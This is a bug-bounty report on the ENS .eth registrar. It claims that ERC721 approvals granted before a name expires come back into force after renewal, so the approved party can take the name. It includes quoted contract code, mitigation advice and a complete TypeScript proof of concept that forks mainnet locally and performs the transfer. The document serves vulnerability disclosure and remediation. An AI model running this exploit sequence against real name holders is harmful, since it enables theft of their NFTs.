# Expired .eth names preserve stale ERC721 approvals that revive after renewal
Severity: Critical

Bounty Criteria Match: critical (smart contract): Direct theft of any user NFTs, whether at-rest or in-motion, other than unclaimed royalties

Affected Contracts:
- [BaseRegistrarImplementation._isApprovedOrOwner](https://github.com/ensdomains/ens-contracts/blob/91c966febd7b55494269df830fc6775f040b927b/contracts/ethregistrar/BaseRegistrarImplementation.sol#L42-L50), [ownerOf](https://github.com/ensdomains/ens-contracts/blob/91c966febd7b55494269df830fc6775f040b927b/contracts/ethregistrar/BaseRegistrarImplementation.sol#L71-L76), [renew](https://github.com/ensdomains/ens-contracts/blob/91c966febd7b55494269df830fc6775f040b927b/contracts/ethregistrar/BaseRegistrarImplementation.sol#L157-L169), and [reclaim](https://github.com/ensdomains/ens-contracts/blob/91c966febd7b55494269df830fc6775f040b927b/contracts/ethregistrar/BaseRegistrarImplementation.sol#L172-L175)
- Inherited [OpenZeppelin ERC721.approve](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.9.3/contracts/token/ERC721/ERC721.sol#L112-L123)

# Finding Description and Impact
An ERC721 token approval granted before expiration can survive the `.eth` name's expired period and become transferable again after renewal. This breaks the registrar expiry model because approval state is not cleared on expiry or renewal, while the expired period prevents normal ownership operations that would clear the stale approval.

- `BaseRegistrarImplementation` makes ownership and transfer/reclaim authorization expiry-aware.
- Token-specific approvals remain stored while the registrar treats the expired name as unowned.
- `renew` extends expiry without clearing token-specific approvals, so the stale approval becomes live again.

The registrar routes transfer/reclaim authorization through expiry-aware ownership:

```solidity
function _isApprovedOrOwner(address spender, uint256 tokenId) internal view override returns (bool) {
    address owner = ownerOf(tokenId);
    return (spender == owner ||
        getApproved(tokenId) == spender ||
        isApprovedForAll(owner, spender));
}

function ownerOf(uint256 tokenId) public view override(IERC721, ERC721) returns (address) {
    require(expiries[tokenId] > block.timestamp);
    return super.ownerOf(tokenId);
}
```

The ERC721 approval slot can remain populated across expiry and renewal:

```solidity
function approve(address to, uint256 tokenId) public virtual override {
    address owner = ERC721.ownerOf(tokenId);
    require(to != owner, "ERC721: approval to current owner");
    require(
        _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
        "ERC721: approve caller is not token owner or approved for all"
    );
    _approve(to, tokenId);
}
```

Renewal only extends expiry and leaves `_tokenApprovals` untouched:

```solidity
function renew(uint256 id, uint256 duration) external override live onlyController returns (uint256) {
    require(expiries[id] + GRACE_PERIOD >= block.timestamp);
    require(expiries[id] + duration + GRACE_PERIOD > duration + GRACE_PERIOD);
    expiries[id] += duration;
    emit NameRenewed(id, expiries[id]);
    return expiries[id];
}
```

### **Exploit Path**
1. Victim owns a `.eth` registrar NFT and grants token-specific ERC721 approval to the attacker.
2. The name expires but remains renewable; public `ownerOf(tokenId)` now reverts.
3. The victim cannot clear the token approval during the expired period.
4. The name is renewed through the normal registrar renewal path.
5. The stored token approval is accepted by `transferFrom`, and `reclaim` updates ENS registry ownership to the attacker.

The renewal step is the normal authorized registrar renewal path; the attacker does not need controller, owner, DAO, or governance privileges. The key precondition is prior token-specific ERC721 approval that remains live after renewal.

### **Impact**
- Direct theft of the renewed ENS registrar ERC721 if stale approval exists.
- Unauthorized reassignment of the ENS registry owner through `reclaim`.
- No leaked keys, DAO/admin role, malicious governance, or trusted protocol role is required.

This matches the ENS Critical smart contract row for direct theft of user NFTs.

### **Recommended Mitigation Steps**
- Clear token-specific approvals during `renew` before the name becomes transferable again.
- Allow the registrar owner to clear token approval during the expired-but-renewable period, or explicitly clear approvals when a name first expires.
- Add regression coverage for token approval, expiry, failed approval clearing, renewal, `transferFrom`, and `reclaim`.

## Proof of Concept

Save as: test/ExpiredApprovalRenewalTheftPoC.test.ts

Run: MAINNET_RPC_URL=<mainnet rpc url> bun run test test/ExpiredApprovalRenewalTheftPoC.test.ts

This PoC starts an Anvil fork from Ethereum mainnet, uses the deployed ENS Registry, BaseRegistrarImplementation, and ETHRegistrarController addresses, and does not mutate live protocol state.

```typescript
import { createAnvil } from '@viem/anvil'
import {
  type Address,
  type Hex,
  createPublicClient,
  createWalletClient,
  hexToBigInt,
  http,
  keccak256,
  labelhash,
  namehash,
  parseEther,
  toBytes,
  toHex,
  zeroHash,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { mainnet } from 'viem/chains'

const MAINNET_FORK_BLOCK = 25030187n
const REGISTRATION_DURATION = 365n * 24n * 60n * 60n
const BASE_REGISTRAR = '0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85'
const ETH_REGISTRAR_CONTROLLER =
  '0x59E16fcCd424Cc24e280Be16E11Bcd56fb0CE547'
const ENS_REGISTRY = '0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e'

const victim = privateKeyToAccount(
  '0x59c6995e998f97a5a0044966f0945389d78589786e8b1a1a0c35a0a1a16cd363',
)
const attacker = privateKeyToAccount(
  '0x5de4111acf9a1971b0b2b092737e3a3a2c88c7b0d1b2e5f1e8b7e7b2f60e8f1b',
)

const controllerAbi = [
  {
    type: 'function',
    name: 'rentPrice',
    stateMutability: 'view',
    inputs: [
      { name: 'label', type: 'string' },
      { name: 'duration', type: 'uint256' },
    ],
    outputs: [
      {
        name: 'price',
        type: 'tuple',
        components: [
          { name: 'base', type: 'uint256' },
          { name: 'premium', type: 'uint256' },
        ],
      },
    ],
  },
  {
    type: 'function',
    name: 'minCommitmentAge',
    stateMutability: 'view',
    inputs: [],
    outputs: [{ name: '', type: 'uint256' }],
  },
  {
    type: 'function',
    name: 'makeCommitment',
    stateMutability: 'pure',
    inputs: [
      {
        name: 'registration',
        type: 'tuple',
        components: [
          { name: 'label', type: 'string' },
          { name: 'owner', type: 'address' },
          { name: 'duration', type: 'uint256' },
          { name: 'secret', type: 'bytes32' },
          { name: 'resolver', type: 'address' },
          { name: 'data', type: 'bytes[]' },
          { name: 'reverseRecord', type: 'uint8' },
          { name: 'referrer', type: 'bytes32' },
        ],
      },
    ],
    outputs: [{ name: '', type: 'bytes32' }],
  },
  {
    type: 'function',
    name: 'commit',
    stateMutability: 'nonpayable',
    inputs: [{ name: 'commitment', type: 'bytes32' }],
    outputs: [],
  },
  {
    type: 'function',
    name: 'register',
    stateMutability: 'payable',
    inputs: [
      {
        name: 'registration',
        type: 'tuple',
        components: [
          { name: 'label', type: 'string' },
          { name: 'owner', type: 'address' },
          { name: 'duration', type: 'uint256' },
          { name: 'secret', type: 'bytes32' },
          { name: 'resolver', type: 'address' },
          { name: 'data', type: 'bytes[]' },
          { name: 'reverseRecord', type: 'uint8' },
          { name: 'referrer', type: 'bytes32' },
        ],
      },
    ],
    outputs: [],
  },
  {
    type: 'function',
    name: 'renew',
    stateMutability: 'payable',
    inputs: [
      { name: 'label', type: 'string' },
      { name: 'duration', type: 'uint256' },
      { name: 'referrer', type: 'bytes32' },
    ],
    outputs: [],
  },
] as const

const baseRegistrarAbi = [
  {
    type: 'function',
    name: 'setApprovalForAll',
    stateMutability: 'nonpayable',
    inputs: [
      { name: 'operator', type: 'address' },
      { name: 'approved', type: 'bool' },
    ],
    outputs: [],
  },
  {
    type: 'function',
    name: 'isApprovedForAll',
    stateMutability: 'view',
    inputs: [
      { name: 'owner', type: 'address' },
      { name: 'operator', type: 'address' },
    ],
    outputs: [{ name: '', type: 'bool' }],
  },
  {
    type: 'function',
    name: 'approve',
    stateMutability: 'nonpayable',
    inputs: [
      { name: 'to', type: 'address' },
      { name: 'tokenId', type: 'uint256' },
    ],
    outputs: [],
  },
  {
    type: 'function',
    name: 'getApproved',
    stateMutability: 'view',
    inputs: [{ name: 'tokenId', type: 'uint256' }],
    outputs: [{ name: '', type: 'address' }],
  },
  {
    type: 'function',
    name: 'nameExpires',
    stateMutability: 'view',
    inputs: [{ name: 'id', type: 'uint256' }],
    outputs: [{ name: '', type: 'uint256' }],
  },
  {
    type: 'function',
    name: 'ownerOf',
    stateMutability: 'view',
    inputs: [{ name: 'tokenId', type: 'uint256' }],
    outputs: [{ name: '', type: 'address' }],
  },
  {
    type: 'function',
    name: 'transferFrom',
    stateMutability: 'nonpayable',
    inputs: [
      { name: 'from', type: 'address' },
      { name: 'to', type: 'address' },
      { name: 'tokenId', type: 'uint256' },
    ],
    outputs: [],
  },
  {
    type: 'function',
    name: 'reclaim',
    stateMutability: 'nonpayable',
    inputs: [
      { name: 'id', type: 'uint256' },
      { name: 'owner', type: 'address' },
    ],
    outputs: [],
  },
] as const

const ensRegistryAbi = [
  {
    type: 'function',
    name: 'owner',
    stateMutability: 'view',
    inputs: [{ name: 'node', type: 'bytes32' }],
    outputs: [{ name: '', type: 'address' }],
  },
] as const

type Registration = {
  label: string
  owner: Address
  duration: bigint
  secret: Hex
  resolver: Address
  data: Hex[]
  reverseRecord: number
  referrer: Hex
}

const rpcUrl = process.env.MAINNET_RPC_URL
const anvil = createAnvil({
  forkUrl: rpcUrl,
  forkBlockNumber: MAINNET_FORK_BLOCK,
  chainId: 1,
  port: 18545,
  startTimeout: 60_000,
})

async function mineAt(timestamp: bigint) {
  await publicClient.request({
    method: 'evm_setNextBlockTimestamp',
    params: [Number(timestamp)],
  } as never)
  await publicClient.request({ method: 'evm_mine', params: [] } as never)
}

async function wait(hash: Hex) {
  await publicClient.waitForTransactionReceipt({ hash })
}

async function fund(address: Address) {
  await publicClient.request({
    method: 'anvil_setBalance',
    params: [address, toHex(parseEther('10000'))],
  } as never)
}

const publicClient = createPublicClient({
  chain: mainnet,
  transport: http(`http://${anvil.host}:${anvil.port}`),
})
const victimWallet = createWalletClient({
  account: victim,
  chain: mainnet,
  transport: http(`http://${anvil.host}:${anvil.port}`),
})
const attackerWallet = createWalletClient({
  account: attacker,
  chain: mainnet,
  transport: http(`http://${anvil.host}:${anvil.port}`),
})

async function registerName(label: string, owner: Address, secret: Hex) {
  const registration: Registration = {
    label,
    owner,
    duration: REGISTRATION_DURATION,
    secret,
    resolver: '0x0000000000000000000000000000000000000000',
    data: [],
    reverseRecord: 0,
    referrer: zeroHash,
  }
  const commitment = await publicClient.readContract({
    address: ETH_REGISTRAR_CONTROLLER,
    abi: controllerAbi,
    functionName: 'makeCommitment',
    args: [registration],
  })
  await wait(
    await victimWallet.writeContract({
      address: ETH_REGISTRAR_CONTROLLER,
      abi: controllerAbi,
      functionName: 'commit',
      args: [commitment],
    }),
  )

  const minCommitmentAge = await publicClient.readContract({
    address: ETH_REGISTRAR_CONTROLLER,
    abi: controllerAbi,
    functionName: 'minCommitmentAge',
  })
  const latestBlock = await publicClient.getBlock()
  await mineAt(latestBlock.timestamp + minCommitmentAge + 1n)

  const price = await publicClient.readContract({
    address: ETH_REGISTRAR_CONTROLLER,
    abi: controllerAbi,
    functionName: 'rentPrice',
    args: [label, REGISTRATION_DURATION],
  })
  await wait(
    await victimWallet.writeContract({
      address: ETH_REGISTRAR_CONTROLLER,
      abi: controllerAbi,
      functionName: 'register',
      args: [registration],
      value: price.base + price.premium,
    }),
  )
}

beforeAll(async () => {
  if (!rpcUrl) throw new Error('Set MAINNET_RPC_URL to run this fork PoC')
  await anvil.start()
  await fund(victim.address)
  await fund(attacker.address)
}, 90_000)

afterAll(async () => {
  await anvil.stop()
})

describe('ExpiredApprovalRenewalTheftPoC', () => {
  it('uses mainnet ENS contracts to show stale approval revives after renewal', async () => {
    const label = 'hiddenapprovalpocfork'
    const tokenId = hexToBigInt(labelhash(label))
    const node = namehash(`${label}.eth`)

    await registerName(
      label,
      victim.address,
      keccak256(toBytes('hidden-approval-secret')),
    )

    // Precondition: attacker receives token approval while the name is active.
    await wait(
      await victimWallet.writeContract({
        address: BASE_REGISTRAR,
        abi: baseRegistrarAbi,
        functionName: 'approve',
        args: [attacker.address, tokenId],
      }),
    )

    const expires = await publicClient.readContract({
      address: BASE_REGISTRAR,
      abi: baseRegistrarAbi,
      functionName: 'nameExpires',
      args: [tokenId],
    })
    await mineAt(expires + 1n)
    await expect(
      publicClient.readContract({
        address: BASE_REGISTRAR,
        abi: baseRegistrarAbi,
        functionName: 'ownerOf',
        args: [tokenId],
      }),
    ).rejects.toThrow()

    // During expiry, ownerOf() rejects and the victim cannot clear approval.
    await expect(
      victimWallet.writeContract({
        address: BASE_REGISTRAR,
        abi: baseRegistrarAbi,
        functionName: 'approve',
        args: ['0x0000000000000000000000000000000000000000', tokenId],
      }),
    ).rejects.toThrow()

    expect(
      await publicClient.readContract({
        address: BASE_REGISTRAR,
        abi: baseRegistrarAbi,
        functionName: 'isApprovedForAll',
        args: [victim.address, attacker.address],
      }),
    ).toBe(false)
    expect(
      (
        await publicClient.readContract({
          address: BASE_REGISTRAR,
          abi: baseRegistrarAbi,
          functionName: 'getApproved',
          args: [tokenId],
        })
      ).toLowerCase(),
    ).toBe(attacker.address.toLowerCase())

    const price = await publicClient.readContract({
      address: ETH_REGISTRAR_CONTROLLER,
      abi: controllerAbi,
      functionName: 'rentPrice',
      args: [label, REGISTRATION_DURATION],
    })
    await wait(
      await victimWallet.writeContract({
        address: ETH_REGISTRAR_CONTROLLER,
        abi: controllerAbi,
        functionName: 'renew',
        args: [label, REGISTRATION_DURATION, zeroHash],
        value: price.base,
      }),
    )

    // After renewal, the stale approval becomes actionable ownership transfer.
    await wait(
      await attackerWallet.writeContract({
        address: BASE_REGISTRAR,
        abi: baseRegistrarAbi,
        functionName: 'transferFrom',
        args: [victim.address, attacker.address, tokenId],
      }),
    )
    await wait(
      await attackerWallet.writeContract({
        address: BASE_REGISTRAR,
        abi: baseRegistrarAbi,
        functionName: 'reclaim',
        args: [tokenId, attacker.address],
      }),
    )

    expect(
      (
        await publicClient.readContract({
          address: BASE_REGISTRAR,
          abi: baseRegistrarAbi,
          functionName: 'ownerOf',
          args: [tokenId],
        })
      ).toLowerCase(),
    ).toBe(attacker.address.toLowerCase())
    expect(
      (
        await publicClient.readContract({
          address: ENS_REGISTRY,
          abi: ensRegistryAbi,
          functionName: 'owner',
          args: [node],
        })
      ).toLowerCase(),
    ).toBe(attacker.address.toLowerCase())
  })
})
```
